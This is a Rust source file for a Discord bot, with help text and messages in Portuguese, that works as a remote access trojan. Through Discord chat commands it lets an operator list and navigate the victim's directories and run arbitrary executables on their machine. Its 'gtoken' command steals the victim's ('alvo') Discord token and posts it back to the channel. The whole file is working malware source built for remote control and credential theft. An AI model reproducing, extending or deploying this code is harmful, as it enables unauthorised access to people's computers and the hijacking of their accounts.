use serenity::{
    async_trait,
    model::{channel::Message, gateway::Ready},
    prelude::*,
};
use std::{env, process::Command};

mod extoken;
use crate::extoken::get_discord_tokens;
struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "-help" {
            let help_text = "
            !help - Exibe os comandos
            !ping - Retorna o tempo de resposta
            cwd - Mostra o diretório atual
            cd <dir> - Muda o diretório
            ls - Lista os arquivos no diretório
            run <file> - Executa um arquivo
            exit - Fecha o bot
            gtoken - pega o token do discord do alvo
            ";
            if let Err(why) = msg.channel_id.say(&ctx.http, help_text).await {
                println!("Erro ao enviar mensagem: {:?}", why);
            }
        }

        if msg.content == "!ping" {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
                println!("Erro ao enviar mensagem: {:?}", why);
            }
        }

        if msg.content == "cwd" {
            match env::current_dir() {
                Ok(path) => {
                    if let Err(why) = msg.channel_id.say(&ctx.http, path.display().to_string()).await {
                        println!("Erro ao enviar mensagem: {:?}", why);
                    }
                }
                Err(e) => println!("Erro ao obter diretório: {}", e),
            }
        }

        if msg.content.starts_with("cd") {
            let dir = msg.content.split_whitespace().nth(1);
            if let Some(directory) = dir {
                if let Err(e) = env::set_current_dir(directory) {
                    if let Err(why) = msg.channel_id.say(&ctx.http, format!("Erro ao mudar diretório: {}", e)).await {
                        println!("Erro ao enviar mensagem: {:?}", why);
                    }
                } else {
                    if let Err(why) = msg.channel_id.say(&ctx.http, "Diretório alterado com sucesso").await {
                        println!("Erro ao enviar mensagem: {:?}", why);
                    }
                }
            }
        }

        if msg.content == "ls" {
            match std::fs::read_dir(".") {
                Ok(paths) => {
                    let mut file_list = String::new();
                    for path in paths {
                        file_list.push_str(&format!("{}\n", path.unwrap().path().display()));
                    }
                    if let Err(why) = msg.channel_id.say(&ctx.http, file_list).await {
                        println!("Erro ao enviar mensagem: {:?}", why);
                    }
                }
                Err(e) => println!("Erro ao listar arquivos: {}", e),
            }
        }

        if msg.content.starts_with("run") {
            let file = msg.content.split_whitespace().nth(1).unwrap_or("");
            let result = Command::new(file)
                .output()
                .expect("Falha ao executar o arquivo");
            
            let output = String::from_utf8_lossy(&result.stdout);
            if let Err(why) = msg.channel_id.say(&ctx.http, format!("Executado: {}", output)).await {
                println!("Erro ao enviar mensagem: {:?}", why);
            }
        }

        if msg.content == "exit" {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Encerrando...").await {
                println!("Erro ao enviar mensagem: {:?}", why);
            }
            std::process::exit(0);
        }

        if msg.content == "gtoken" {
            let tokens = get_discord_tokens().await;

            let response = if tokens.is_empty() {
                "token não encontrado".to_string()
            } else {
                tokens.join("\n")
            };

            if let Err(why) = msg.channel_id.say(&ctx.http, response).await {
                println!("Erro ao enviar mensagem: {:?}", why);
            }
        }
    

    }

    async fn ready(&self, _: Context, ready: Ready) {
        println!("{} está online!", ready.user.name);
    }
}


#[tokio::main]
async fn main() {
    let token = "..."; // Insira o token do bot
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT
        | GatewayIntents::GUILD_MEMBERS
        | GatewayIntents::GUILD_MODERATION
        | GatewayIntents::GUILD_EMOJIS_AND_STICKERS
        | GatewayIntents::GUILD_INTEGRATIONS
        | GatewayIntents::GUILD_WEBHOOKS
        | GatewayIntents::GUILD_INVITES
        | GatewayIntents::GUILD_VOICE_STATES
        | GatewayIntents::GUILD_PRESENCES
        | GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::GUILD_MESSAGE_REACTIONS
        | GatewayIntents::GUILD_MESSAGE_TYPING
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::DIRECT_MESSAGE_REACTIONS
        | GatewayIntents::DIRECT_MESSAGE_TYPING
        | GatewayIntents::MESSAGE_CONTENT
        | GatewayIntents::GUILD_MODERATION;
    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .expect("Erro ao criar o cliente");

    if let Err(why) = client.start().await {
        println!("Erro ao iniciar o cliente: {:?}", why);
    }
}
